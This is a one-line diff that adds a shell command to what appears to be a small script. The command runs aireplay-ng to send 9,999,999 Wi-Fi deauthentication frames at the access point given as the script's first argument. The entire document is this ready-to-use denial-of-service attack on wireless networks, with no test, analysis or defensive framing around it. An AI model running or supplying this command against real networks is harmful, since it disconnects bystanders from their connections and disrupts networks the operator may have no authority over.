@@ -1,0 +1,1 @@
+ sudo aireplay-ng --deauth 9999999 -a  $1 wlan0mon 
